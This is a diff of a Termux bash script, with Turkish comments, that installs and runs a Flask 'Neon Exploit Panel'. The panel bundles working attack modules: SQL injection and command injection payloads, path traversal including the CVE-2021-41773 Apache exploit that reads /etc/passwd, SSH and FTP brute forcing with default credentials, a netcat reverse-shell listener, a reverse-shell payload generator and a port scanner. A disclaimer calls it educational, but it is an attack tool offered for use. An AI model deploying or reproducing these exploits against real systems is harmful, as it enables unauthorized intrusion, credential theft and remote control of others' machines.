@@ -1,21 +1,48 @@
 #!/data/data/com.termux/files/usr/bin/bash
 set -e
 
-echo "[+] Neon Exploit Panel - Termux için tek script"
-echo "[+] Gerekli paketler yükleniyor..."
+# Renkli çıktı için
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+CYAN='\033[0;36m'
+NC='\033[0m' # No Color
 
-# Gerekli paketler
+echo -e "${CYAN}[+] Neon Exploit Panel - Otomatik Kurulum ve Çalıştırma${NC}"
+echo -e "${CYAN}[+] Sadece eğitim ve yetkilendirilmiş testler için kullanın.${NC}"
+
+# 1. Sistem güncelleme ve temel paketler
+echo -e "${GREEN}[1/6] Sistem güncelleniyor ve temel paketler yükleniyor...${NC}"
 pkg update -y
 pkg install -y python python-pip netcat-openbsd
 
-# Python kütüphaneleri
-pip install flask requests paramiko --quiet
+# 2. Rust kontrolü (cryptography derlemesi için)
+echo -e "${GREEN}[2/6] Rust kontrol ediliyor...${NC}"
+if ! command -v rustc &> /dev/null; then
+    echo -e "${CYAN}Rust bulunamadı, kuruluyor...${NC}"
+    pkg install -y rust
+else
+    echo -e "${CYAN}Rust zaten kurulu.${NC}"
+fi
 
-# Rastgele bir port seç (panel için)
+# 3. Python kütüphaneleri (flask, requests) ve paramiko
+echo -e "${GREEN}[3/6] Python kütüphaneleri yükleniyor...${NC}"
+pip install flask requests --quiet
+
+# paramiko'yü pip ile dene, başarısız olursa Termux paketini kullan
+echo -e "${CYAN}Paramiko yükleniyor...${NC}"
+if pip install paramiko --quiet; then
+    echo -e "${GREEN}Paramiko pip ile başarıyla yüklendi.${NC}"
+else
+    echo -e "${CYAN}Pip başarısız oldu, Termux paketi deneniyor...${NC}"
+    pkg install -y python-paramiko
+fi
+
+# 4. Rastgele port seç
 PANEL_PORT=$(( RANDOM % 1000 + 5000 ))
 
-# Python kodunu geçici dosyaya yaz
-cat > /data/data/com.termux/files/usr/tmp/neon_exploit_panel.py << 'EOF'
+# 5. Python kodunu geçici dosyaya yaz
+echo -e "${GREEN}[4/6] Python panel kodu oluşturuluyor...${NC}"
+cat > /data/data/com.termux/files/usr/tmp/neon_panel.py << 'EOF'
 import random
 import socket
 import threading
@@ -25,9 +52,15 @@ import subprocess
 import os
 import sys
 import ftplib
-import paramiko
 import requests
 from flask import Flask, render_template_string, request, jsonify
+
+# paramiko yüklü mü kontrol et
+try:
+    import paramiko
+    PARAMIKO_AVAILABLE = True
+except ImportError:
+    PARAMIKO_AVAILABLE = False
 
 app = Flask(__name__)
 
@@ -92,7 +125,6 @@ def scan_ports(ip, ports, progress_callback=None):
     return results
 
 # ---------- Exploit modülleri ----------
-# HTTP exploit'ler
 def sqli_exploit(ip, port):
     url = f"http://{ip}:{port}/login"
     payload = {"username": "' OR 1=1 --", "password": "x"}
@@ -106,7 +138,6 @@ def sqli_exploit(ip, port):
         return {"success": False, "error": str(e)}
 
 def cmd_injection(ip, port):
-    # Örnek: ping komutu enjeksiyonu
     url = f"http://{ip}:{port}/ping"
     payload = {"ip": "127.0.0.1; id"}
     try:
@@ -129,8 +160,9 @@ def path_traversal(ip, port):
     except:
         return {"success": False, "error": "Bağlantı hatası"}
 
-# Brute force
 def ssh_brute(ip, port, userlist=["root", "admin"], passlist=["password", "123456"]):
+    if not PARAMIKO_AVAILABLE:
+        return {"success": False, "message": "Paramiko kurulu değil, SSH brute kullanılamaz."}
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     for user in userlist:
@@ -156,12 +188,10 @@ def ftp_brute(ip, port, userlist=["root", "admin"], passlist=["password", "12345
                 continue
     return {"success": False, "message": "FTP brute failed"}
 
-# Reverse shell
 def start_listener(port):
     global listener_process
     if listener_process and listener_process.poll() is None:
         return {"success": False, "message": "Listener already running"}
-    # Netcat ile dinleyici başlat (Termux'ta nc var)
     cmd = f"nc -lvnp {port}"
     listener_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     return {"success": True, "message": f"Listener started on port {port}"}
@@ -176,7 +206,6 @@ def generate_payload(ip, port, type="bash"):
     else:
         return "Unknown type"
 
-# CVE-2021-41773 (Apache Path Traversal)
 def cve_2021_41773(ip, port):
     url = f"http://{ip}:{port}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
     try:
@@ -188,7 +217,6 @@ def cve_2021_41773(ip, port):
     except:
         return {"success": False, "error": "Bağlantı hatası"}
 
-# Tüm exploit'lerin listesi
 exploit_functions = {
     "sqli": sqli_exploit,
     "cmd_inj": cmd_injection,
@@ -434,7 +462,6 @@ HTML_TEMPLATE = """
 </div>
 
 <script>
-    // İlk yüklemede log göster
     fetch('/log').then(r=>r.text()).then(t=>document.getElementById('log_content').innerText=t);
 </script>
 </body>
@@ -449,7 +476,6 @@ def index():
 @app.route('/scan')
 def scan():
     ip = request.args.get('ip', '127.0.0.1')
-    # Tarama yapılacak portlar (örnek)
     ports_to_scan = [21,22,80,443,8080,3306,5432,25,110,143,445,139]
     log(f"Tarama başlatıldı: {ip}")
     results = scan_ports(ip, ports_to_scan)
@@ -510,8 +536,15 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(port), debug=False)
 EOF
 
-# PANEL_PORT değişkenini Python dosyasına yaz
-sed -i "s/\$PANEL_PORT/$PANEL_PORT/" /data/data/com.termux/files/usr/tmp/neon_exploit_panel.py
+# 6. Python dosyasındaki port değişkenini güncelle
+sed -i "s/\$PANEL_PORT/$PANEL_PORT/" /data/data/com.termux/files/usr/tmp/neon_panel.py
 
-echo "[+] Panel başlatılıyor... Adres: http://localhost:$PANEL_PORT"
-python /data/data/com.termux/files/usr/tmp/neon_exploit_panel.py
+echo -e "${GREEN}[5/6] Panel başlatılıyor...${NC}"
+echo -e "${CYAN}Adres: http://localhost:$PANEL_PORT${NC}"
+echo -e "${RED}[!] Ctrl+C ile durdurabilirsiniz.${NC}"
+
+# 7. Python panelini çalıştır
+python /data/data/com.termux/files/usr/tmp/neon_panel.py
+
+# (İsteğe bağlı: çıkışta geçici dosyayı sil)
+# rm /data/data/com.termux/files/usr/tmp/neon_panel.py
